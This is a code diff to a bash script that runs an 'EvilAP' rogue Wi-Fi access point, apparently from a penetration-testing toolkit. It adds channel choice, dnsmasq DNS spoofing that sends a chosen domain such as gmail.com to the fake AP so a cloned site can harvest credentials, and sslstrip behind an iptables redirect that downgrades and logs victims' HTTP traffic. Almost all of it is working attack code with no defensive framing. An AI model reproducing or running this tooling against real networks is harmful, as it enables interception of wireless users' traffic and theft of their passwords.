@@ -32,6 +32,8 @@ f_clean_up() {
   echo
   killall airbase-ng
   killall dhcpd
+  killall dnsmasq
+  killall sslstrip
   airmon-ng stop mon0
   iptables --flush
   iptables --table nat --flush
@@ -96,7 +98,97 @@ f_ssid(){
   fi
 }
 
-#########################################
+########################################
+f_channel(){
+  clear
+  echo
+  read -p "Enter the channel to run the EvilAP on (1-14): " channel
+  echo
+  
+}
+
+##########################################
+f_dnsmasq(){
+  
+  clear
+  echo
+  echo "Do you want to spoof a DNS name to point back to EvilAP address?" 
+  echo
+  echo "Use with SET website cloner to redirect wireless client to fake page to harvest credentials."
+  echo "(Example: gmail.com)"
+  echo
+  echo "1. Yes"
+  echo "2. No"
+  echo
+  read -p "Choice: " dnschoice
+
+  if [ -z $dnschoice ] 
+    then 
+      dnschoice="1"
+  fi
+
+   if [ $dnschoice -eq 1 ]
+    then
+    echo
+    read -p "Enter DNS name to spoof (Example: gmail.com): " dnshost
+    echo
+    echo "DNSmasq running redirecting $dnshost to EvilAP IP address 192.168.7.1"
+   fi
+
+
+}
+
+##########################################
+f_dnsmasqrun(){
+
+  if [ $dnschoice -eq 1 ]
+    then
+  	dnsmasq -i at0 --address=/$dnshost/192.168.7.1 -c /etc/dnsmasq.conf
+    else
+        dnsmasq -i at0 -c /etc/dnsmasq.conf
+  fi
+
+}
+
+##########################################
+f_sslstrip(){
+  
+  clear
+  echo
+  echo "Run SSLstrip with EvilAP?" 
+  echo
+  echo
+  echo "1. Yes"
+  echo "2. No"
+  echo
+  read -p "Choice: " sslstrip
+
+  if [ -z $sslstrip ] 
+    then 
+      sslstrip="1"
+    fi
+
+}
+
+##########################################
+f_sslstriprun(){
+
+
+DEFS="/opt/pwnpad/easy-creds/definitions.sslstrip"
+
+sslstripfilename=sslstrip$(date +%F-%H%M).log
+
+    if [ $sslstrip -eq 1 ]
+    then 
+ 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
+
+	sslstrip -pfk -w /opt/pwnpad/captures/sslstrip/$sslstripfilename  -l 8888 at0 &
+    
+    fi
+
+}
+
+##########################################
 f_preplaunch(){
   #Change the hostname and mac address randomly
 
@@ -125,7 +217,7 @@ f_evilap(){
   logname="/opt/pwnpad/captures/evilap-$(date +%s).log"
 
   #Start Airbase-ng with -P for preferred networks 
-  airbase-ng -P -C 30 -c 3 -e "$ssid" -v mon0 > $logname 2>&1 & 
+  airbase-ng -P -C 30 -c $channel -e "$ssid" -v mon0 > $logname 2>&1 & 
   sleep 2
 
   #Bring up virtual interface at0
@@ -138,6 +230,9 @@ f_evilap(){
   echo 1 > /proc/sys/net/ipv4/ip_forward
   iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE
 
+  f_dnsmasqrun
+  f_sslstriprun
+  
   tail -f $logname
 }
 
@@ -147,7 +242,7 @@ f_niceap(){
   logname="/opt/pwnpad/captures/evilap-$(date +%s).log"
 
   #Start Airbase-ng with -P for preferred networks 
-  airbase-ng -C 30 -c 3 -e "$ssid" -v mon0 > $logname 2>&1 &
+  airbase-ng -C 30 -c $channel -e "$ssid" -v mon0 > $logname 2>&1 &
   sleep 2
 
   #Bring up virtual interface at0
@@ -159,6 +254,9 @@ f_niceap(){
   #IP forwarding and iptables routing using internet connection
   echo 1 > /proc/sys/net/ipv4/ip_forward
   iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE
+  
+  f_dnsmasqrun
+  f_sslstriprun
 
   tail -f $logname
 }
@@ -186,7 +284,10 @@ f_run(){
   f_clean_up
   f_interface
   f_ssid
+  f_channel
   f_karmaornot
+  f_sslstrip
+  f_dnsmasq
   f_preplaunch
   if [ -z $karma ]
   then
